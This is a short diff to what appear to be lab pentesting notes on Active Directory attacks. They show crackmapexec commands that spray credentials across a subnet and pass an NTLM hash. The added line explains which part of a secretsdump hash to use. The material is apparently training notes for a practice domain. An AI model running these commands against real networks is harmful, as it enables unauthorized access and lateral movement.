@@ -7,6 +7,7 @@ example: crackmapexec smb 192.168.16.0/24 -u fcastle -d MARVEL.local -p Password
 Usage: crackmapexec smb [ ip/CIDR] -u [username] -d [domain] -p [password]
 ```
 ### Pass the Hash
+Once you get the hash from secrets dump you only want the second part of the hash after the colon
 ```bash
 crackmapexec smb 192.168.16.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b --local-auth
 ```
